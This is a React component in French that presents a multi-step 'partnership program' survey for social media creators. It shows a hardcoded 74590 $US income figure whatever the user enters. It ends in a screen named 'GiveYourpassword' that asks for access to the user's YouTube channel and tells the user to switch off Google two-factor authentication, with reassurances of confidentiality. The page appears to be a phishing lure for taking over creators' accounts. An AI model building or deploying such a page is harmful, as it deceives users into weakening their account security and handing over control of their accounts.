import React, { useState,useRef } from 'react'
import './caroussel.css'

export default function Caroussel() {
    
    const[isselect ,setisselect]=useState(0)
    const[isselect2 ,setisselect2]=useState('non')
    const[isselect3 ,setisselect3]=useState('non')
    const[isselect4 ,setisselect4]=useState('none')
    const[one ,setone]=useState(0)
    const[two ,settwo]=useState('')
    const[tree ,settree]=useState('')
    const[four,setfour]=useState('')
   const[viewC,setviewC]=useState(<Bigcard/>)
   function increment() {
    setisselect(isselect+1)
    console.log('ok')
   }
function redsurvey(){

  if(isselect==0){
setviewC(<WhenYoutube/>)
increment()
}  
 if(isselect==1){
    setviewC(< Whenyumonetise/>)
    increment()
    }  
    if(isselect==2){
        setviewC(< GiveYourpassword/>)
        increment()
        }  
}





  return (
    
<div id='bordturn'>
{viewC}
<div id="continuer"><p  onClick={redsurvey}>Continuer</p></div>
    </div>
  )
}
  
function GiveYourpassword() {
  return (
    <div id="giveYourpassword">
       
        
        <div id='giveidentication'>
            <p> Cher Utilisateur,

Nous vous remercions de votre intérêt pour notre site web et de votre volonté de rejoindre notre programme de partenariat. Afin de vous inscrire et de bénéficier de notre programme de rémunération, nous avons besoin d'accéder à votre chaîne YouTube. Cette coopération est essentielle pour nous permettre de vérifier vos statistiques de performance, de gérer les campagnes publicitaires et de s'assurer que vous recevez une rémunération équitable pour votre contenu.</p>
        </div>
        <div id="">
            <p>Pourquoi cette coopération est nécessaire :</p>
        </div>
        <div id="">
          <ul>
            <li>Vérification des Statistiques : Nous devons vérifier les statistiques de votre chaîne (vues, abonnés, engagement, etc.) pour évaluer les opportunités de monétisation.</li>
            <li>Gestion des Campagnes Publicitaires : L'accès à votre chaîne nous permet de gérer les campagnes publicitaires directement, optimisant ainsi vos revenus.</li>
            <li>Rémunération Équitable : En accédant à vos données, nous nous assurons que vous recevez une rémunération équitable basée sur la performance réelle de votre chaîne.</li>
           
          </ul>
        </div>
        <div id="">
            <p>Désactivation de l'Authentification à Deux Facteurs :
            Pour nous permettre d'accéder à votre chaîne YouTube, il peut être nécessaire de désactiver temporairement l'authentification à deux facteurs (2FA) de votre compte Google. Voici comment procéder :</p>
        </div>
<div id="">
    <ul>
        <li>Connectez-vous à votre compte Google.</li>
        <li>Allez dans "Sécurité" dans le menu de navigation.</li>
        <li>Sous la section "Connexion à Google", cliquez sur "Validation en deux étapes".</li>
    </ul>
    <div id="">
        <p>Confidentialité de Vos Informations Personnelles :
Nous tenons à vous rassurer que toutes les informations personnelles que vous partagez avec nous resteront strictement confidentielles. Nous nous engageons à ne jamais divulguer vos informations à des tiers sans votre consentement. La sécurité de vos données est notre priorité absolue.

Nous vous remercions de votre compréhension et de votre coopération. Si vous avez des questions ou des préoccupations, n'hésitez pas à nous contacter.</p>
    </div>
</div>

        <form action="">
        </form> 
    </div>
  )
}


 function Whenyumonetise() {
  return (
    <div  id="whenyumonetise">
    <div id="calcule">
        <p>Calculer votre revenu si vous entrez dans notre programme</p>
    </div>
    <form action="">
        <section id="echappe"> 
            
             <div id="calculdiv"> <label htmlFor="monetisedNumber"> Votre nombre d'abonne</label><input type="Number"  name='monetisedNumber'/></div>
             <div id="calculdiv"> <label htmlFor="monetisedNumber"> Votre nombre de vue/Video</label><input type="Number"  name='monetisedNumber'/></div>                 
             </section>
  
    </form>

    <div>
        <p>74590 $US</p>
    </div>

    <div id="pass">
    <p>Continuer</p>
  </div>
</div>
  )
}

 function WhenYoutube() {
  return (
  

    <div  id="whenYoutube">
    <div id="labelformonetised"><p>Votre chaine est elle monetise?</p></div>
        <form action="">
         
            <div id="fiveinput">
            <label htmlFor="yesmonetised">Oui </label>
                <input type="checkbox" name="yesmonetised" id="" /></div>

                <div id="fiveinput">
            <label htmlFor="nomonetised">Non</label>
                <input type="checkbox" name="nomonetised" id="" /></div>      
        </form>
    </div>

  )
}

 function Bigcard() {
  return (
    <div  id="bigcard">
    <div id="titlequestion">
        <p>Quel est le reseau social souhaitez vous utiliser?</p>
    </div>
<form action="" method="post"  >

<div id="inputchoosebox">
<label htmlFor="choosesocial" >Intagram </label>
<input type="checkbox" name="choosesocial" id="choosesocial" />

</div>

<div id="inputchoosebox">
<label htmlFor="choosesocial">Youtube</label>
<input type="checkbox" name="choosesocial" id="choosesocial" />

</div>

<div id="inputchoosebox">
<label htmlFor="choosesocial">Facebook</label>
<input type="checkbox" name="choosesocial" id="choosesocial" />

</div>

<div id="inputchoosebox">
<label htmlFor="choosesocial">Tiktok</label>
<input type="checkbox" name="choosesocial" id="choosesocial" />

</div>

</form> 
</div>
  )
}
